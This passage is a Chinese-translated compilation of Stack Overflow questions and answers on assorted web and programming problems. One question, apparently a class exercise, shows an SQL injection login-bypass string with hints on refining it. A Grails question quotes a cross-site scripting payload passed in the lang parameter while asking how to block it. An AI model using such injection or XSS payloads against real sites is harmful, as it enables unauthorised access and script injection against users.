INSERT INTO feed 
   (SELECT 2, '1', '1' FROM dual  
     WHERE NOT EXISTS (     SELECT 1 FROM feed WHERE id = 3) );
Result:
SELECT * FROM feed
1   1   1   <BLOB>
2   1   1   <BLOB> 
```

# python - 使用 matplotlib 注释某些点

> ID：10499885
> 
> 赞同：4
> 
> 时间：2012-05-08T13:45:32.837
> 
> 标签：python, matplotlib

虽然我可以拼凑代码来绘制 XY 图，但我想要一些额外的东西：

*   从 X 轴向上延伸到指定距离的垂直线
*   注释该点的文本，接近是必须的（见红色文本）
*   该图是独立的图像：一个 800 长的序列应该占据 800 像素的宽度（我希望它与特定图像对齐，因为它是一个强度图）

![在此处输入图像描述](../Images/194a8d7011788aa75b1d5d5f4527a337.png)

如何在 mathplotlib 中制作这样的图表？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-05-08T14:14:44.620

你可以这样做：

```
import matplotlib.pyplot as plt

fig = plt.figure()
ax = fig.add_subplot(1, 1, 1)
data = (0, 2, 3, 5, 5, 5, 9, 7, 8, 6, 6)
ax.plot(data, 'r-', linewidth=4)

plt.axvline(x=5, ymin=0, ymax=4.0 / max(data), linewidth=4)
plt.text(5, 4, 'your text here')
plt.show() 
```

请注意，有点奇怪的是`ymin`和`ymax`值从 运行`0 to 1`，因此需要对轴进行归一化

![在此处输入图像描述](../Images/9d3d028b7e39ec9559ecce759acb60d6.png)

* * *

**编辑：** OP 已修改代码以使其更加面向对象：

```
fig = plt.figure()
data = (0, 2, 3, 5, 5, 5, 9, 7, 8, 6, 6)

ax = fig.add_subplot(1, 1, 1)
ax.plot(data, 'r-', linewidth=4)
ax.axvline(x=5, ymin=0, ymax=4.0 / max(data), linewidth=4)
ax.text(5, 4, 'your text here')
fig.show() 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-05-08T15:10:04.640

这不是 你想要的[http://matplotlib.sourceforge.net/api/pyplot_api.html?highlight=annotate#matplotlib.pyplot.annotate吗？](http://matplotlib.sourceforge.net/api/pyplot_api.html?highlight=annotate#matplotlib.pyplot.annotate)

# jquery - 对于每个 div，如果其子元素全部隐藏，则隐藏前一个元素？

> ID：10499886
> 
> 赞同：0
> 
> 时间：2012-05-08T13:45:33.497
> 
> 标签：jquery, each

我有一个与此链接类似的带有分隔符的过滤列表。我的工作与示例完全相同，除了分隔线在内容为空时不隐藏，这是我想要实现的。

[http://jquerymobile.com/test/docs/lists/lists-search-with-dividers.html](http://jquerymobile.com/test/docs/lists/lists-search-with-dividers.html)

keyup 事件中的第一个代码块用于过滤列表，但是当我添加第二个块时它会中断。

```
$("#filter").keyup(function () {
    var filter = $(this).val(), count = 0;
    $(".filtered:first li").each(function () {

        if ($(this).text().search(new RegExp(filter, "i")) < 0) {

            $(this).addClass("hidden");
        } else {
            $(this).removeClass("hidden");
            count++;
        }

    });

    //code i've added
    $('.li-group').each(function(){
        if($(this).children(':visible').length == 0) {
           $(this).prev().css('display','none');
        }
    }):

}); 
```

我的 HTML 有这样的结构：

```
<li class="divider">A</li>
<div class="li-group">
  <li>
    <a href="#">Link</a>
  </li>
  <li>
    <a href="#">Link</a>
  </li>
</div>

<li class="divider">B</li>
<div class="li-group">
  <li>
    <a href="#">Link</a>
  </li>
  <li>
    <a href="#">Link</a>
  </li>
</div> 
```

我试图用我的代码做的是，在每个 keyup 事件上，检查是否所有的孩子`div.li-group`都被隐藏，如果是，那么隐藏前一个元素，即列表的分隔符。

注意，我知道我的代码目前没有语义，但我想在我回去清理代码之前让我的演示工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T14:31:44.513

您在评论中给出的[链接](http://jsfiddle.net/jamesbrighton/C5vKM)在 jquery 代码中包含错误：

```
$("#filter").keyup(function () {
    $('.li-group').each(function(){
        if($(this).children(':visible').length == 0) {
           $(this).prev().css('display','none');
        }
    }):
      ^ should be ; 
}); 
```

我纠正了错误，它很好

**[更正的代码](http://jsfiddle.net/C5vKM/1/)**

# jquery - 根据文本值禁用下拉列

> ID：10499890
> 
> 赞同：1
> 
> 时间：2012-05-08T13:45:46.930
> 
> 标签：jquery, jquery-ui, sharepoint, sharepoint-2010, sharepoint-designer

我正在使用 SharePoint 2010 表单库。

我有一个依赖于文本输入列值的下拉列。

文本输入列中的值来自信息路径表单。

**我想要的是：-**

假设文本列值为“AU”，则禁用下拉列，否则启用它。

我想在 Sharepoint 表单库编辑页面（Editpage.aspx）中对此进行编码。

我认为使用 Jquery 是可能的。

任何帮助/建议将不胜感激。

- 更新：

这是我在 Sharepoint 编辑页面中使用的代码：

```
<script type="text/javascript" src="/SiteAssets/jquery-1.6.2.min.js"></script> 
<script type="text/javascript"> 
    $(document).ready(function() { 
        if ($("#Test Value").val() != null) { 
            $("Select[Title='Test_Status']").attr('disabled', 'disabled'); 
        } 
    }); 
</script> 
```

但它不工作！简而言之，我想要的是当文本列（测试值）值为空白时，选择列（测试状态）应该被禁用，反之亦然。供参考见下图： ![在此处输入图像描述](../Images/c90b149dcd57d42c3dede2219ffee714.png)

![在此处输入图像描述](../Images/736d5382f3c3988dd6c9d88664ec9a42.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T16:58:44.013

尝试：

```
$(document).ready(function() { 
    if ($("input[title='Test Value']").val()) { 
        $("select[title='Test_Status']").attr('disabled', 'disabled'); 
    } 
    else { 
        $("select[title='Test_Status']").removeAttr('disabled'); 
    } 
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-10T12:34:52.830

我已经解决了这个问题：

下面是 Javascript 的源代码附上它。

src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.4/jquery.min.js"

**在 javasrcipt 标签中写下所有代码**

$(文档).ready(函数() {

```
// add change handler
$("input[title='Test Value']").change(function() {
    MasterSelectChange();
});
// call the change function to set up form for first display:
MasterSelectChange(); 
```

});

函数 MasterSelectChange()

{

```
var thisVal =  $("input[title='Test Value']").val();

if(thisVal == "AU")
{
  $("select[title='Test_Status']").closest("tr").hide();

    }
else
{
      $("select[title='Test_Status']").show();

} 
```

}

# jquery - 在 Facebook Like 按钮上单击 +1 更新数据库？

> ID：10499892
> 
> 赞同：0
> 
> 时间：2012-05-08T13:45:52.113
> 
> 标签：jquery, ajax, facebook-graph-api, facebook-like

当一个人点击一个赞按钮时，是否可以更新数据库计数器。

```
<div class="fb-like" data-send="true" data-width="450" data-show-faces="true"></div> 
```

ONclick 事件或 Jquery/Ajax 脚本是否适用？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-08T13:57:43.497

看看这个文档，特别是 edge.create 事件

[https://developers.facebook.com/docs/reference/javascript/FB.Event.subscribe/](https://developers.facebook.com/docs/reference/javascript/FB.Event.subscribe/)

# javascript - iPad光标在textareas中跳跃（位移）

> ID：10499893
> 
> 赞同：0
> 
> 时间：2012-05-08T13:45:52.717
> 
> 标签：javascript, css, ipad, textarea

我正在检查我在具有 iOs 5.1 的 Ipad 中的应用程序当我在 textarea 中点击时，光标会在书写线上方跳两行。焦点在正确的位置，但光标的视觉外观在焦点线上方两行。关于此的任何建议。

[这是 CSS 文件代码](http://tinypaste.com/0b49c264)

[这是从萤火虫而不是从文件中提取的 HTML 部分（您可以看到标签名称）](http://tinypaste.com/96df1c87) [视频以显示问题（视频不是我制作的，但问题类似）](http://tinypic.com/r/20k6338/7)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T17:16:45.010

iPad 可能对`touch`事件有一些补偿，您可以使用如下函数取消它：

```
$('#yourTextarea').on('touchstart', function (event) {
    event.preventDefault(); //should prevent the hop
    // rest of your code goes here
}); 
```

# c# - url 重写活动时未调用 WebMethod

> ID：10499894
> 
> 赞同：6
> 
> 时间：2012-05-08T13:45:59.273
> 
> 标签：c#, jquery, ajax, webmethod

我知道那里有类似的帖子，但我没有找到任何帮助。

当我不使用 url 重写时，我的 web 方法可以工作，但是一旦我打开它就停止工作。

**jQuery**

```
 $.ajax({
            type: "POST",
            url: "index.aspx/SaveSetting",
            contentType: "application/json; charset=utf-8",
            dataType: "json",
            success: function(msg) {
                console.log(msg);
            }
        }); 
```

**C＃**

```
 [WebMethod()]
    [ScriptMethod(UseHttpGet = true, ResponseFormat = ResponseFormat.Json)]
    public static string SaveSetting()
    {
        return "OK";
    } 
```

当它被调用时，我得到了我页面的完整 HTML，并且没有“OK”消息。我运行了调试器，发现当我调用 web 方法时，它会在我的页面中触发 Page_Load 而不是 web 方法。

所以我得到了corerct路径，但是没有调用web方法。

我使用 C#、jQuery、ASP.NET 3.5。

有什么帮助吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-08T15:31:55.057

您需要使用指向您的网络方法的完整链接。

如果您查看萤火虫，您会看到，例如：

[http://localhost/test1/index.aspx/SaveSetting](http://localhost/test1/index.aspx/SaveSetting)作为您尝试请求的 url，假设 /test1 重写为 /index.aspx

假设该页面位于您网站的根目录，则以下内容将起作用：

网址：/index.aspx/SaveSetting

（顺便说一句，这根本不适用于 url 路由！）

也许将您的网络方法移动到 asmx 文件中？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-08T16:30:44.033

如果您将此添加到您的 javascript：

```
PageMethods.set_path("/whatever/the/actual/path/is/index.aspx"); 
```

然后你的标准 webmethod 调用应该可以工作：

```
PageMethods.SaveSetting(console.log); 
```

我的回答取自之前提出的[这个问题。](https://stackoverflow.com/questions/4321240/pagemethod-and-url-rewrite)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-07-09T17:21:03.083

只是一个后续行动，以防其他人偶然发现这一点。web.config 中还需要一些东西来确保 IIS 了解如何处理 webmethod 的请求，而不仅仅是页面本身：

```
<httpModules>
    <add name="ScriptModule" type="System.Web.Handlers.ScriptModule, System.Web.Extensions, Version=3.5.0.0, Culture=neutral, PublicKeyToken=31BF3856AD364E35"/>
</httpModules> 
```

如果没有这一行，我会遇到完全相同的问题 - 服务器将返回整个 FRONT 网页，而不是来自 webmethod 的响应。

web.config 中可能还有其他需要的东西。我的是巨大的（哈！！）所以谁知道还有什么可能会影响这个问题。

# javascript - 用于网站 API javascript 的 php 谷歌地图

> ID：10499898
> 
> 赞同：0
> 
> 时间：2012-05-08T13:46:11.380
> 
> 标签：javascript, php, google-maps

我正在尝试在我的 php 网站上获取网站 API 的谷歌地图。为此，我有一个为地图加载用户变量的 php 页面。javascript 在具有默认值的网页中运行良好，但我无法将 $php 变量加载到脚本中。

也许一些 javascript 专家可以帮忙

```
function onProfileDisplay() {
            $user           = CFactory::getRequestUser();
            $document       =& JFactory::getDocument();
            $document->addStyleSheet($css);
            $my         = CFactory::getUser();
            $pluginParams = $this->params;
            $param = new stdClass;
            $param = $Lat = $pluginParams->get('Lat');
            $param = $Lng = $pluginParams->get('Lng');
            $param = $width = $pluginParams->get('width');
            $param = $height = $pluginParams->get('height');
            $param = $zoom = $pluginParams->get('zoom');
            return '<body onload="onprofileDisplay()">  <div id="map_canvas" style="width:800px; height:500px"></div>
                    <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
                    <script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
                    <script type="text/javascript">

 function onProfileDisplay() {
            var latlng = new google.maps.LatLng(57.0442, 9.9116);
            **var zoom = <?php echo ($zoom) ?>;**
            var settings = {
                    **zoom: zoom,**
                    center: latlng,
                    mapTypeControl: true,
                    mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
                    navigationControl: true,
                    navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
                    mapTypeId: google.maps.MapTypeId.ROADMAP
                    };
            var map = new google.maps.Map(document.getElementById("map_canvas"), settings);
            var companyPos = new google.maps.LatLng(57.0442, 9.9116);
            var companyMarker = new google.maps.Marker({
            position: companyPos,
            map: map,
            title:"Some title"
            });
            }
            </script>
                    ';
            } 
```

测试我只是试图将 php 变量 $zoom 加载到 javascript 中，但它在 javascript 内部不起作用：

```
var zoom = <?php echo ($zoom) ?>;
zoom: zoom, 
```

但它不起作用，如果我将 javascript 更改为原始 remove var zoom = ; 缩放：15，然后它可以工作，但使用静态默认值

帮助表示赞赏。

**这是输出代码：**

```
<script type="text/javascript">
    function onProfileDisplay() { 
    var latlng = new google.maps.LatLng(57.0442, 9.9116);
    var zoom = ".$zoom.";
            var settings = {
                    ".$zoom.":".$zoom.",
                    center: latlng,
                    mapTypeControl: true,
                    mapTypeControlOptions: {style:   google.maps.MapTypeControlStyle.DROPDOWN_MENU},
                    navigationControl: true,
                    navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
                    mapTypeId: google.maps.MapTypeId.ROADMAP
                    };
            var map = new google.maps.Map(document.getElementById("map_canvas"), settings);
            var companyPos = new google.maps.LatLng(57.0442, 9.9116);
            var companyMarker = new google.maps.Marker({
            position: companyPos,
            map: map,
            });
            }
    </script> 
```

原始代码如下所示：

```
 public function onProfileDisplay() {
                $user           = CFactory::getRequestUser();
                $document       =& JFactory::getDocument();
                $document->addStyleSheet($css);
                $my         = CFactory::getUser();
                $pluginParams = $this->params;
                $param = new stdClass;
                $param = $api_key = $pluginParams->get('api_key');
                $param = $Lat = $pluginParams->get('Lat');
                $param = $Lng = $pluginParams->get('Lng');
                $param = $width = $pluginParams->get('width');
                $param = $height = $pluginParams->get('height');
                $param = $zoom = $pluginParams->get('zoom');
                 return  '<body onload="onProfileDisplay()">
                        <div id="map_canvas" style="width:800px; height:500px"></div
</body>
                        <meta name="viewport" content="initial-scale=1.0, user-scalable=no" />
                        <script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false"></script>
                        <script type="text/javascript">
                function onProfileDisplay() {
                var latlng = new google.maps.LatLng(57.0442, 9.9116);
                var zoom = ".$zoom.";
                var settings = {
                        ".$zoom.":".$zoom.",
                        center: latlng,
                        mapTypeControl: true,
                        mapTypeControlOptions: {style: google.maps.MapTypeControlStyle.DROPDOWN_MENU},
                        navigationControl: true,
                        navigationControlOptions: {style: google.maps.NavigationControlStyle.SMALL},
                        mapTypeId: google.maps.MapTypeId.ROADMAP
                        };
                var map = new google.maps.Map(document.getElementById("map_canvas"), settings);
                var companyPos = new google.maps.LatLng(57.0442, 9.9116);
                var companyMarker = new google.maps.Marker({
                position: companyPos,
                map: map,
                });
                }
                </script>';
                }
    }
    ?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T14:45:26.300

为什么将 PHP 放入 PHP->javascript 函数的返回中？似乎获得结果的方法很繁琐。

无论如何 - 为什么不把 PHP 函数的实际值放在那里呢？一旦它们在客户端的 javascript 中，您将无法使用服务器端值。

例子：

> 函数 onProfileDisplay() {
> var latlng = new google.maps.LatLng(57.0442, 9.9116);
> var zoom = " . $zoom ."
> var settings = {
> " . $zoom . ":" . $zoom . ",
> center: latlng,

# jquery - mp3 和 ogg 在 Firefox 中使用 jQuery jPlayer

> ID：10499902
> 
> 赞同：2
> 
> 时间：2012-05-08T13:46:49.053
> 
> 标签：jquery, html, firefox, jplayer

我正在尝试开发一个在线音乐点唱机（有点像“deezer”，我制作了一个小视频： http: [//www.le-guevel.com/player.ogv](http://www.le-guevel.com/player.ogv)）。我正在使用 jQuery jPlayer 在浏览器端读取音乐，但我遇到了 firefox 的问题：它不读取我的 mp3 文件。

我知道 Mozilla 出于专利原因拒绝实施它。我也知道 jPlayer 应该回退到 Flash 解决方案来读取 mp3。问题是我实际上读取了不同格式的文件（主要是 mp3 和 ogg）。从我在 jPlayer 源代码（2.1.0 版本中的〜l.640）中可以看到：

```
 // If jPlayer is supporting any format in a solution, then the solution is used.
    this.html.used = false;
    this.flash.used = false;
    $.each(this.solutions, function(solutionPriority, solution) {
      $.each(self.formats, function(formatPriority, format) {
        if(self[solution].support[format]) {
          self[solution].used = true;
            return false;
        }
      });
    }); 
```

播放器决定使用 html5 或 flash（不是两者）。因此，当我用 ogg 和 mp3 初始化 jPlayer 时，播放器决定使用 html5（支持 ogg）。我可以更改解决方案的优先级（html 和 flash）。但是如果我将 flash 设置为最高优先级，播放器将不会播放我的 ogg 文件，因为 jPlayer 的 flash 二进制文件不支持 ogg。

有什么办法可以让它工作吗？

最简单的解决方案当然是以相同的格式对我的所有文件进行编码，但我不希望这样做。
第二种解决方案是强制 Firefox 读取 mp3。我知道 firefox 可以使用外部插件读取 mp3：我在我的 debian 上安装了 gecko-mediaplayer，我可以在 firefox 上读取 mp3 文件。但它与 html5 兼容吗？
第三种解决方案是编辑 jPlayer flash 插件以使其支持 ogg。但是我对 Actionscript 编程一无所知，我更喜欢使用 html5 ......
最后的解决方案是使用另一个浏览器（如 chromium），但我习惯于 firefox 并且更愿意保留它。

正如您可以想象的那样，我更喜欢第二种解决方案，但我不确定它是否可行。有人可以帮我吗？

谢谢 :) （对我可能糟糕的英语感到抱歉）。

# web-services - 返回中间结果的 Web 服务

> ID：10499904
> 
> 赞同：2
> 
> 时间：2012-05-08T13:46:56.370
> 
> 标签：web-services, asynchronous, messaging, synchronous

实现在返回调用的实际结果之前返回一些中间结果（例如，长期事务的状态）的 Web 服务的最佳方式是什么？

如果 Web 服务调用必须是同步的，那么最好的方法是什么？

# java-native-interface - JNI UnsatisfiedLinkError 和类型解析

> ID：10499907
> 
> 赞同：0
> 
> 时间：2012-05-08T13:47:13.860
> 
> 标签：java-native-interface, unsatisfiedlinkerror

我有一个 dll，我想在我的 java 代码中使用它。我将一个函数声明为原生函数，返回类型为 bool (c)。正如我在 JNI 文档中看到的，java 'boolean' 应该在 c 代码中映射为 'jboolean'。但问题是我没有c代码，只有dll。

我的实际问题是 UnsatisfiedLinkError，但我不知道还有什么问题。

如果是问题，我应该再写一个 c-wrapper 吗？

（我知道这个异常已经讨论过很多次了，但是根据我的情况没有找到一些有用的信息）

UPD：也许还有另一种使用 dll 的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-09T23:56:54.733

您不能直接从 Java 中使用任意 DLL。您必须声明一个本地 Java 方法，为其编写 JNI，并从 JNI 代码中调用 DLL 方法。

# php - 如何在 jquery / php 中获取图像的一部分？

> ID：10499909
> 
> 赞同：0
> 
> 时间：2012-05-08T13:47:17.087
> 
> 标签：php, jquery, image

假设我有一张图片

它的大小是

> 高度：150
> 像素宽度：100 像素。

我想得到它的一部分，假设是全高，但宽度介于`30-80px`. 所以它会是

> 高度：150
> 像素宽度：100 像素。

我不想扩大规模。我想从中切下一部分。（感谢编辑，这称为裁剪）。

怎么做？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:52:29.613

有（有点鲜为人知的）[clip](http://www.w3.org/TR/CSS21/visufx.html#clipping) css 属性，尽管它确实要求被剪辑的元素是 position: absolute; （这是一个耻辱）：

```
img {
    position: absolute;
    clip: rect(0 100px 200px 0);
    /* clip: shape(top right bottom left); NB 'rect' is the only available option */
} 
```

[参考](http://www.w3schools.com/cssref/pr_pos_clip.asp)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:50:03.827

jQuery 不能像那样修改图像元素。您最好的选择是将其放置在`overflow:hidden`必须给人以被剪切的印象的父元素中。或者您可以使用`clip`CSS 规则。如果你真的想制作一个新图像，你可以使用 jQuery 来收集图像上的坐标并将它们修补回服务器端脚本，以实际执行繁重的工作并异步提供新图像。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:51:14.063

图像编辑超出了 JavaScript 的范围。您只能显示图像的某个部分，但实际上不能更改图像文件：

```
<div id="imgwrapper"><img src="blah.jpg" width="100" height="150"></div>

#imgwrapper {
    width: 100px;
    height: 50px;
    overflow: hidden;
    position: relative;
}
#imgwrapper img {
    position: absolute;
    top: -30px;
    left: 0;
} 
```

请注意，使用此解决方案，内部图像是`absolute`ly 定位的，而外部 div 是`relative`ly 定位的，这可能比绝对定位和`clip`ped 图像更适合您的页面布局。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-08T13:51:36.947

我认为您最好的选择是尝试使用 html 画布。

*   [http://www.w3schools.com/html5/canvas_drawimage.asp](http://www.w3schools.com/html5/canvas_drawimage.asp)
*   [http://www.w3schools.com/html5/canvas_getimagedata.asp](http://www.w3schools.com/html5/canvas_getimagedata.asp)

两者都允许渲染源图像的一部分，getImageData() 函数还允许读回图像数据并对其进行操作（对于整个图像或部分图像）。

# php - 对 Select 语句的 SQL 注入攻击

> ID：10499916
> 
> 赞同：2
> 
> 时间：2012-05-08T13:47:28.897
> 
> 标签：php, sql

我正在尝试在 Firefox 上使用 Tamper Data 插件完成 SQL 注入。为我提供了一个为此目的准备的网站，我需要做的是用适当的字符串填写用户名和密码字段以进行登录。

首先，我仔细检查了“magic quotes gpc”是否关闭。之后，我将以下行写入用户名和密码；

```
test' or '1=1 
```

但是，我仍然无法登录系统。知道为什么会这样吗？

这是sql的php代码；

```
$sql = "SELECT user_id, username, user_password, user_active, user_level, user_login_tries,
user_last_login_try FROM " . USERS_TABLE . " WHERE username = '" . $username . "'"; 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T13:50:23.170

在不为您做功课的情况下回答这个问题很棘手。

尝试用普通用户名写下您在提交时想象网站正在执行的查询，然后用您的用户名写下查询。

语法仍然有效吗？

“注入 SQL”命令必须（通常）仍然是有效的 SQL。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-08T13:51:14.017

这取决于 SQL 的编写方式。如果您知道，请发布它。如果你不这样做，那么你的工作就是不断尝试不同的攻击方法，对数据库和 SQL 查询做出不同的假设，直到你进入。

我也想试一试。地址是什么？

**编辑：** 既然已经发布了 SQL，我建议 OP 在攻击中添加一个 LIMIT 子句。另外，将第二个引号`'`字符移动到更好的位置（您仍然需要考虑 SQL 语句的结束引号）。

# configuration - LDAP 服务器配置：olcIdleTimeout 和 olcLogFile

> ID：10499918
> 
> 赞同：0
> 
> 时间：2012-05-08T13:47:33.107
> 
> 标签：configuration, openldap

出于测试的目的，我`ve setup a LDAP server. I`将**olcIdleTimeout**属性设置为 5（秒），并将**olcLogFile 设置**为 /var/log/slapd.log。然后我重新启动了 slapd 服务。所以条目看起来像这样：

```
olcIdleTimeout: 5 
olcLogFile: /var/log/slapd.log 
```

没有应用这种更改是否有原因？日志文件是空的（我是手动创建的，因为我在某处读到它必须在写入之前创建），并且 5 秒后页面上没有任何反应。

：-/

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T22:27:10.477

olcXXX 属性用于在线配置。所以你根本不需要重新启动 slapd。听起来好像您将在线配置指令放入 slapd.conf。他们不会在那里工作。删除“olc”部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T04:42:06.633

olcLogFile 仅在 Windows 上使用，因为它缺少 syslog。

检查此以获取更多信息

[https://serverfault.com/questions/324608/how-do-i-get-openldap-on-centos-6-to-write-anything-to-its-log-files](https://serverfault.com/questions/324608/how-do-i-get-openldap-on-centos-6-to-write-anything-to-its-log-files)

# java - 打印 HashMap 值（这些值是数组）错误

> ID：10499919
> 
> 赞同：3
> 
> 时间：2012-05-08T13:47:33.623
> 
> 标签：java, arrays, hashmap

我一直在尝试和寻找与我相似的问题近 2 天，希望我能找到答案，但不，我不能，所以我决定在这里问你们。

此方法是打印出 a 的所有键和值`HashMap<String, int[]>` `ratingmap`。所以键是`String`s，值是数组。我一直在努力，下面是我的代码。

```
public void showRatingsMap() {
    for (String customer: ratingmap.keySet()) {
        String key = customer.toString();
        int[] value = ratingmap.get(key);
        System.out.println("Customer: " + key + " - Rating: " + value);
    }
} 
```

我现在真的很困惑，因为打印出来的结果是这样的：

```
Customer: Douglas Anderson - Rating: [I@4f5b571e
Customer: Sidney - Rating: [I@75b49b45
Customer: Apollo - Rating: [I@243e0b62
Customer: Leslie - Rating: [I@655d6184 
```

正如我所期望的评级是一个数组，但它总是显示为上面的奇怪组合：[I@2b9fd66a

谁能指出导致问题的错误？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-08T13:49:51.143

数组不会覆盖默认[`toString()`](http://docs.oracle.com/javase/7/docs/api/java/lang/Object.html#toString%28%29)方法。为了打印其内容的表示，您可以使用[`Arrays.toString(int[])`](http://docs.oracle.com/javase/7/docs/api/java/util/Arrays.html#toString%28int%5B%5D%29).

[有关更多详细信息，请参阅我的](https://stackoverflow.com/questions/8410294/why-does-printlnarray-have-strange-output-ljava-lang-string3e25a5/8410311#8410311)答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-08T13:49:52.843

值是“int[]”，一个整数数组。但是，当您将该对象转换为字符串时，它不会自动为您打印数组的所有元素。它只打印数组在内存中的位置，这就是您所看到的。

您需要遍历数组的元素才能打印它们。像这样：

```
for (int v : value) {
    System.out.println(v);
} 
```

或者，正如保罗所说（使用帮助类，如数组）

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-08T13:53:48.643

您看到的是内置`toString`整数数组类型的结果——它打印“数组类型”`[I`部分和“引用”部分，例如，`@75b49b45`在同一个 JVM 中每个实例都不同。

您需要的是手动迭代数组项并分别打印：

```
 int array[] = new int[] {3, 1, 4, 1};
    for (int i : array)
        System.out.print(i + " ");
    System.out.println(); 
```

或者您可以将数组转换为`List`具有更友好`toString()`实现的数组：

```
 int array[] = new int[] {3, 1, 4, 1};
    List<Integer> asList = new ArrayList<Integer>();

    for (int i : array)
        asList.add(i);
    System.out.println(asList); 
```

关于起点，有一个解释为什么你会看到`[I`- 这是因为数组具有内置的，它是从类的实现`toString`继承的，后者通过打印它被调用的类的类型代码，然后是类实例的内部 id 来工作。整数数组的类型代码是.`toString()``Object``@``[I`

`Class#getName()`请参阅JDK中的 javadoc 中可能的类型代码的完整描述。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-08T13:53:51.563

最简单的解决方案是使用它`HashMap<String, List<Integer>>`，因为它会按照您的预期打印。

# java - Java Swing - 使两个 JLists “兄弟” - 即只能选择其中一个项目

> ID：10499924
> 
> 赞同：2
> 
> 时间：2012-05-08T13:47:46.883
> 
> 标签：java, swing, jpanel, jlist, listeners

我有一个 JPanel，其中包含两个 JLists - 两者都可以在其中选择一个项目 - 正如预期的那样。

我想做的就是拥有它，以便在其中一个项目中只选择一个项目

任何人都可以帮助我吗

a）“嫁给”他们，这样就可以了

b）给我一些最佳实践的提示，以编写可以同时主持它们的侦听器，并在选择另一个时取消选择一个的所有元素-如果可能的话，我宁愿避免这种情况，因为我可以看到它变得丑陋！

谢谢 ：）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-08T14:02:44.650

我认为，对于用户来说，最好的解决方案是在每个列表旁边放置一个带有类别标签的单选按钮，这样每次选择一个时，您都可以清楚地禁用另一个。

我可以想象用户单击第一个列表上的值，然后单击下一个并看到他单击的所有值都消失了，逻辑上的挫败感......

然后，当您从表单中获取值时，只需获取启用的值

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-05-08T14:09:27.420

听者写起来并不难也不难看。我会

*   确保列表仅支持单选
*   将相同的选择侦听器添加到两个列表的选择模型

这个监听器可以实现为

```
public void valueChanged(ListSelectionEvent e){
  if ( e.isAdjusting()) return;

  ListSelectionModel sourceSelectionModel = (ListSelectionModel) e.getSource();
  if ( !sourceSelectionModel.isSelectionEmpty() ){
    //still need to implement the findOtherSelectionModel method
    ListSelectionModel other = findOtherSelectionModel( sourceSelectionModel );
    other.clearSelection();
  }
} 
```

请注意，清除选择将再次触发侦听器，但由于`isSelectionEmpty`检查，您不会以循环结束。另一种方法是在您调用另一个列表`boolean`之前禁用监听器（例如使用标志） 。`clearSelection`

# grails - grails损坏的语言参数

> ID：10499925
> 
> 赞同：1
> 
> 时间：2012-05-08T13:47:52.453
> 
> 标签：grails, locale

我们知道在 URL 中传递 lang 参数会改变 grails 应用程序的语言环境

```
/url?lang=de 
```

在代码中，我可以通过 RequestContextUtils.getLocale(request) 获取语言环境，它使用 lang 参数返回在 ParamsAwareLocaleChangeInterceptor（grails 源的一部分）中设置的语言环境。

如果将脚本或损坏的字符串作为值传递给 lang 参数，则会将相同的废话设置为语言环境。

```
/url?lang=>"'><script>alert(167) </script>&=>"'><script>alert(167)</script> 
```

通过此请求，http 标头中的 Content-language 设置为 script= lang 参数的值。在这个 RCU.getLocale() 返回这个恶意脚本之后，它会弄乱我网站的内容，因为很多内容是根据语言环境决定的。是解决这个问题的一种方法（在设置语言环境之前清理语言）还是这是一个 grails 错误？

另外，我可以限制在 lang 中传递的内容吗？例如：如果站点仅支持“en”和“de”，则传递的 /url?lang=es 会混淆内容。在 grails 拦截器中更改语言环境之前，有没有办法可以将 lang 参数的值限制为仅“en”和“de”，可能在过滤器或其他东西中？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-08T15:19:34.023

我能想到 3 种可能的选择。

1）要限制语言，您可以根据每个请求在过滤器中设置语言环境。但是，您每次重新加载时都会重置。

```
def filters = {

    before = {
        def locale = new Locale("sv","SV")
        RCU.getLocaleResolver(request).setLocale(request, response, locale)                  
    }

 } 
```

2) 您可以删除所有消息属性文件，只留下 messages.properties 文件。所以系统会一直默认这个属性文件。

3) 你可以在你的 config/spring/resources.groovy 中设置一个 LocaleResolver 来设置默认的语言环境。

# ios - 如果从显示的 pdf 复制文本，iOS UIWebview 崩溃

> ID：10499933
> 
> 赞同：1
> 
> 时间：2012-05-08T13:48:19.910
> 
> 标签：ios, pdf, uiwebview

在问我的问题之前，我曾尝试在 stackoverflow 和谷歌中进行大量搜索。似乎是类似的问题，但对我来说没有答案。所以我想问问！！

